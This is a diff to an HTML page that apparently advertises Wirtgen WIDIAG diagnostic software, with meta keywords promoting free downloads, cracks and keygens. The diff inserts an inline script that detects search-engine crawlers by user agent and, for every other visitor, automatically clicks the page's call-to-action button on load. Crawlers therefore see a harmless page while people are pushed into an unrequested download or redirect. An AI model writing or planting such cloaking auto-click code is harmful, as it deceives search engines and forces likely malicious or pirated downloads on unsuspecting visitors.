@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wirtgen WIDIAG 1.07.007 05.2022</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Wirtgen WIDIAG 1.07.007 diagnostic software for construction equipment, 05.2022 release, supports PEAK PCAN-USB, Windows 10 &amp; 11.">
     <meta name="keywords" content="Wirtgen WIDIAG 1.07.007, Wirtgen Diagnostic software, Wirtgen Group equipment, construction equipment diagnostics, road milling machine software, cold recycler diagnostics, soil stabilizer software, Wirtgen machinery diagnostic tool, WIDIAG 1.07.007 download, WIDIAG 1.07.007 05.2022, WIDIAG 05.2022, Wirtgen equipment troubleshooting, construction machinery software, Wirtgen road construction diagnostics, WIDIAG update, Wirtgen maintenance software, Wirtgen Group diagnostic program, Wirtgen WIDIAG free download, Wirtgen WIDIAG keygen, Wirtgen WIDIAG crack, Wirtgen diagnostic software download, Wirtgen diagnostic software download free, Wirtgen diagnostic software crack, Wirtgen diagnostic software keygen, Wirtgen diagnostic software 1.07.007, скачать программное обеспечение Wirtgen WIDIAG бесплатно, программное обеспечение для диагностики Wirtgen, Wirtgen WIDIAG скачать, Wirtgen Свободная загрузка программного обеспечения, загрузить Wirtgen WIDIAG бесплатно">
     <style>
